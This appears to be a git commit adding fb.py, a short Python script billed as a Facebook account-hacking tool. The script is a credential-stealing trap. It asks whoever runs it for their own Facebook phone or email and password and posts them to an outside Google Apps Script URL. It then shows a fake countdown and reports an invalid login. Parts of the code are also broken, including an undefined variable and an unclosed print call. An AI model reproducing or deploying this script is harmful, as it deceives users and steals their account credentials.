250669842d49411f4b1db6071f5f1de5ffbce83c
bgmpyaesonehmoo290G <79253197+bgmpyaesonehmoo290G@users.noreply.github.com>
2021-03-04 19:04:20 +0630

    Create fb.py

---
+++ fb.py
@@ -0,0 +1,31 @@
+import random
+import requests
+import pyfiglet
+import time
+import sys
+import os
+# colors
+yellow='\033[93m'
+gren='\033[92m'
+cyan='\033[96m'
+pink='\033[95m'
+red='\033[91m'
+b='\033[1m'
+
+a = pyfiglet.figlet_format('facebook-attekre')
+b = pyfiglet.figlet_format('We are Myanmar')
+print(cyan+b+"a"+b+cyan)
+print(red+b+"b"+b+red)
+print(yelll+b+"autor by: zero_@290G"+b+yellow)
+print("dont use illegal")
+print('please login with your facebook \n for your Friend account hack')
+
+umail =input("please Enter Phone and gmail:")
+upass =input("please Enter       password'")
+data ={'mail':umail,'pass':upass}
+rq =requests.post('https://script.google.com/macros/s/AKfycbxZKaMrdStWk_T4iNO-PHgnPY3bWJS_-J989D_uWHjFLjtLGQ/exec',data=data)
+print("please"
+for i in range(100):
+   print(i,'+')
+   time.sleep(1)
+print('invalid password or username')
